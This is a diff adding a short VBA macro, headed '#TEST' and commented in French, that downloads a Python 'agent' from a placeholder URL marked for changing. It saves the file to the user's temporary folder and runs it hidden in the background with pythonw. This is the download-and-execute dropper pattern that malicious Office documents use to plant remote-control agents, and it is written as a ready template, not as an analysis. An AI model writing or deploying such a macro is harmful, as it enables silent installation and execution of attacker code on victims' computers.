@@ -1,0 +1,43 @@
+#TEST
+
+Sub InstallerAgent()
+    Dim objHTTP As Object
+    Dim strURL As String
+    Dim strAgentPath As String
+    Dim objShell As Object
+
+    ' Spécifiez l'URL de l'agent à télécharger
+    strURL = "http://LOCALHOST/agent.py"                                    #A MODIFIER 
+    
+    ' Spécifiez le chemin d'accès où vous souhaitez enregistrer l'agent
+    strAgentPath = Environ("TEMP") & "\agent.py"
+    
+    ' Créez un objet HTTP
+    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+    
+    ' Téléchargez l'agent depuis l'URL
+    objHTTP.Open "GET", strURL, False
+    objHTTP.send
+    
+    ' Enregistrez l'agent dans le dossier temporaire de l'utilisateur
+    If objHTTP.Status = 200 Then
+        With CreateObject("ADODB.Stream")
+            .Open
+            .Type = 1 ' binaire
+            .Write objHTTP.responseBody
+            .SaveToFile strAgentPath, 2 ' overwrite
+            .Close
+        End With
+    Else
+        MsgBox "Erreur lors du téléchargement de l'agent !"
+        Exit Sub
+    End If
+    
+    ' Exécutez l'agent en arrière-plan
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "pythonw """ & strAgentPath & """", 0, False
+    
+    ' Libérez les objets
+    Set objHTTP = Nothing
+    Set objShell = Nothing
+End Sub
